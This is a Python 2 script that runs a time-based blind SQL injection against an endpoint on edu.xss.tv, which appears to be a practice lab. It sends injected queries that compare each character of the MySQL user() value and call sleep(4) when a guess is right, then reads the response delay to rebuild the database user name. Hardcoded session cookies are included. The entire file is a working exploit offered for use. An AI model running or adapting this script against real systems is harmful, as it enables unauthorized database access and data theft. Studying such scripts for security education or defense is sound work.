
#coding:utf-8
import sys
import time
import httplib

header = {
			'Host': 'edu.xss.tv',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Cookie': 'Hm_lvt_e5efb7047a682ed4bd398034a6316c5e=1500722638; __cfduid=d0672c891f9f5f300118bc70e80b073ff1500722631; Hm_lpvt_e5efb7047a682ed4bd398034a6316c5e=1500722991; PHPSESSID=7dt7nnh0c2el942pln9nubqdu6',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1'
}

user = ''
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
payloads = list('abcdefghijklmnopqrstuvwxyz1234567890@_\/.*')

for i in range(1,20):
	for payload in payloads:
		t = time.strftime('%H:%M:%S', time.localtime())
		urls = "/payload/sql/time.php?id=1' and (if(substr(user(),%s,1)='%s',sleep(4),'1'))='1" %(i,payload)
		conn = httplib.HTTPConnection('edu.xss.tv',timeout=10)
		conn.request(method='GET',url = urls,headers=header)
		start_time = time.time()
		r = conn.getresponse().read()
		conn.close()
		print "*",
		if time.time()-start_time > 3.0:
			user += payload
			sys.stdout.write('\n['+t+'] '+user+' ')
			break
print "\n[Done] Mysql user is : %s" %user